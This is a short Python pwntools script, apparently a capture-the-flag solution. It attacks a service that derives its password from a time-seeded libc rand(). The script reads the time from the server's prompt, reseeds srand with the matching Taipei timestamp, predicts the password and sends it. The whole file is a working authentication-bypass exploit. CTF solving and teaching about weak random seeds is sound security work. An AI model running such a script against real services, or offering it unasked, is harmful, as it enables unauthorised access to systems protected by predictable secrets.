#!/usr/bin/python3
import pwn
import sys
import datetime
import pytz
import ctypes
import warnings
# Filter out the BytesWarning
warnings.filterwarnings("ignore", category=BytesWarning)

libc = ctypes.CDLL('libc.so.6')
srand = libc.srand
rand = libc.rand

if __name__ == '__main__':
    localMode = len(sys.argv) != 3
    attack = b'88'
    target = None

    if localMode:
        target = pwn.process(sys.argv[1])  # Use local file
    else:
        server = sys.argv[1]
        port = int(sys.argv[2])
        target = pwn.remote(server, port)  # Connect to the server

    prompt = target.recvuntil(': ').decode()
    time_seed = prompt.split()[0].split(':')
    hour, minute, second = int(time_seed[0]), int(time_seed[1]), int(time_seed[2])

    timezone = pytz.timezone("Asia/Taipei")
    current_date = datetime.datetime.now(timezone)
    desired_time = datetime.time(hour=hour, minute=minute, second=second)
    time_obj = datetime.datetime.combine(current_date, desired_time)
    timestamp = int(timezone.localize(time_obj).timestamp())

    srand(timestamp)
    passwd = str(rand())

    target.sendline(passwd.encode())
    print(target.recvall().decode("utf-8", "ignore").strip())